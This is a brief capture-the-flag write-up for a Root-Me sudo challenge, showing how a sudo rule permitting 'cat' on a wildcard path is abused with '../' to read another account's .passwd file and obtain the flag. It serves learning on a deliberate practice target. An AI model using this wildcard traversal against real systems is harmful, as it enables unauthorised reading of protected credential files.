```
 	ssh -p 2222 app-script-ch1@challenge02.root-me.org
```

The provided PDF explains a lot about sudo.
If you type

```
sudo -l
```

you will see that we can run the following command:

```
(app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/ch1/*
```

This is a big breach in security, because in \*, .. are allowed.
```
sudo -u app-script-ch1-cracked cat /challenge/app-script/ch1/ch1/../ch1cracked/.passwd
```

We have the flag !
